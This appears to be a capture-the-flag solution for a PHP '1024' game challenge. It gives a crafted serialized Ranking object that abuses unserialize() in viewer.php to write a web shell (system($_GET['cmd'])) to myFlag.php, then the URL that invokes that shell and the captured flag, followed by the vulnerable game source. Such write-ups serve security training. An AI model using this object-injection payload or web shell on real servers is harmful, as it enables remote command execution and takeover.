O:7:"Ranking":3:{s:7:"ranking";s:34:"<?php echo system($_GET['cmd']);?>";s:7:"changed";b:1;s:4:"path";s:12:"./myFlag.php";}

http://1024.training.jinblack.it/games/myFlag.php?cmd=export

flag{never_deserialize_user_input!}



innergame.php


 <?php
// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);
error_reporting(0);
/**
 * @param array      $array
 * @param int|string $position
 * @param mixed      $insert
 */
function array_insert(&$array, $position, $insert)
{
    if (is_int($position)) {
        array_splice($array, $position, 0, $insert);
    } else {
        $pos   = array_search($position, array_keys($array));
        $array = array_merge(
            array_slice($array, 0, $pos),
            $insert,
            array_slice($array, $pos)
        );
    }
}

class Replay{
  public $oldGame;
  public $currentGame;
  public $currentPos=0;

  function __construct($game){
      $this->oldGame = $game;
      $this->currentGame = new Game;
      $this->currentGame->initSeed($this->oldGame->srand);
      $this->currentGame->gameBoard = $game->initgameBoard;
  }

  function next(){
    $action = $this->oldGame->actions[$this->currentPos];
    $this->currentGame->move($action);
    $this->currentPos += 1;
  }

  function prev(){
    $this->currentGame = new Game;
    $this->currentGame->initSeed($this->oldGame->srand);
    $this->currentGame->gameBoard = $this->oldGame->initgameBoard;
    for($i=0; $i < $this->currentPos-1; $i++){
      $action = $this->oldGame->actions[$i];
      $this->currentGame->move($action);
    }
    $this->currentPos -= 1;
    if ($this->currentPos <0){
      $this->currentPos = 0;
    }
  }

}

class Ranking{
  public $ranking = [];
  public $changed = false;
  public $path = "./games/ranking";

  function __construct(){
    if(file_exists($this->path) && filesize($this->path) > 0){
      $file = fopen($this->path, "r");
      $data= fread($file,filesize($this->path));
      fclose($file);
      $this->ranking = unserialize($data);
    }
  }

  function removeExtra($name){
    if (sizeof($this->ranking) <= 10){
      return;
    }
    $count = 0;
    for ($i = 0; $i < sizeof($this->ranking); $i++){
      if ($this->ranking[$i]->name == $name){
        if ($count >0){
          array_splice($this->ranking, $i, 1);
          return;
        }
        $count++;
      }
    }
  $this->ranking = array_slice($this->ranking, 0, 10);
  }

  function updateRanking($game){
    for ($i =0; $i < sizeof($this->ranking); $i++){
      // if ($game->name == $this->ranking[$i]->name){
      //   return;
      // }
      if ($game->score > $this->ranking[$i]->score){
        array_insert($this->ranking, $i, [$game]);
        $this->removeExtra($game->name);
        $this->changed = true;
        return;
      }
    }
    if (sizeof($this->ranking) < 10){
      array_push($this->ranking, $game);
      $this->changed = true;
    }
  }

  function __destruct(){
    if ($this->changed){
      $file = fopen($this->path, "w");
      $data = serialize($this->ranking);
      fwrite($file, $data);
      fclose($file);
    }
  }


}

class Game{
  public $gameBoard;
  public $score = 0;
  public $actions = [];
  public $initgameBoard;
  public $srand;
  public $name;

  function randomTile() {
      $size = count($this->gameBoard);
      while (true) {
        $row = rand(0,$size-1);
        $col = rand(0,$size-1);
        if ($this->gameBoard[$row][$col] == 0) {
          $val = rand(0,100) > 80 ? 4 : 2;
          $this->gameBoard[$row][$col] = $val;
          return $this->gameBoard;
        }
      }
  }

  function initSeed($seed){
      $this->srand = $seed;
      srand($this->srand);
  }

  function initGameBoard($size){
      $this->srand = time();
      srand($this->srand);
      $this->actions = array();
      $this->gameBoard = array();
      for ($row = 0; $row < $size; $row++){
          array_push($this->gameBoard, array_fill (0, $size , 0));
      }
      $this->randomTile();
      $this->randomTile();
      $this->initgameBoard = $this->gameBoard;
  }

  function getTile($i, $j, $direction) {
      $size = count($this->gameBoard);
      switch ($direction) {
        case "left":
          return $this->gameBoard[$i][$j];
        case "right":
          return $this->gameBoard[$i][$size - 1 - $j];
        case "up":
          return $this->gameBoard[$j][$i];
        case "down":
          return $this->gameBoard[$size - 1 - $j][$i];
      }
  }

  function setTile($i, $j, $direction, $value) {
      $size = count($this->gameBoard);
      switch ($direction) {
        case "left":
          $this->gameBoard[$i][$j] = $value;
          break;
        case "right":
          $this->gameBoard[$i][$size - 1 - $j] = $value;
          break;
        case "up":
          $this->gameBoard[$j][$i] = $value;
          break;
        case "down":
          $this->gameBoard[$size - 1 - $j][$i] = $value;
          break;
      }
      return $this->gameBoard;
  }

  function move($direction){
      $moved = false;
      $size = count($this->gameBoard);
      for ($i = 0; $i < $size; $i++) {
        for ($j = 0; $j < $size; $j++) {
          // Find non-empty tile
          $k = $j + 1;
          while ($k < $size && $this->getTile($i, $k, $direction) == 0) {
            $k++;
          }
          if ($k == $size)
            continue;

          // k < size && tiles[i][k]
          if ($this->getTile($i, $j, $direction) == $this->getTile($i, $k, $direction)) {

            $this->setTile($i, $j, $direction, $this->getTile($i, $j, $direction) * 2);
            $this->setTile($i, $k, $direction, 0);

            $this->score += $this->getTile($i, $j, $direction);
            $moved = true;
          } else if ($this->getTile($i, $j, $direction) == 0) {

            $this->setTile($i, $j, $direction, $this->getTile($i, $k, $direction));
            $this->setTile($i, $k, $direction, 0);

            // Stay on the same tile!
            $j--;
            $moved = true;
          }
        }
      }

      if ($moved){
          array_push($this->actions,$direction);
          $this->randomTile();
      }
      $r = new Ranking();
      $r->updateRanking($this);
      return $this->gameBoard;
  }
}
?>  



viewer.php



    <?php
include 'innerGame.php';
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Start the session
session_start();
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <title>1024</title>
  <meta name="description" content="1024 game">
  <link rel="icon" href="./icons/ico.png" type="image/x-icon">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <link rel="stylesheet" href="./css/orange.css">
</head>

<body>

  <h1>
    1024 - <a href="index.php">Play</a> - <a> RePlay </a>
  </h1>

  <h3>Score: <span id="score">0</h3>
  <form enctype="multipart/form-data" action="/viewer.php" method="post">
  <div style="margin: 32px; display: flex; justify-content: center">
    <p style="margin: 0">Replay file:&nbsp</p>
    <input type="file"
           id="replay" name="replay">
    <br/>
  </div>
  <div style="margin: 32px; justify-content: center">
    <button class="btn" id="restart">Load Replay</button>
  </div>
  </form>
  <?php
  if (isset($_FILES['replay'])){
      $filename = $_FILES['replay']["tmp_name"];
      $file = fopen($filename, "r");
      $data= fread($file,filesize($filename));
      fclose($file);
      $data = unserialize($data);
      $_SESSION['replay'] = new Replay($data);
      }
  ?>
  <button class="btn" id="next">Next</button>
  <button class="btn" id="prev">Prev</button>

  <table id="tablegame">
    <tr><td><div id="movelist"></div></td>
        <td>
        <canvas width="400" height="400" id="canvas"></canvas>
        </td>
    </tr>
  </table>

  <script src="./js/jquery-2.1.1.min.js"></script>
  <script src="./js/hammer.js"></script>
  <script src="./js/scriptViewer.js"></script>
  <script src="./js/axios.min.js"></script>

</body>

</html>
  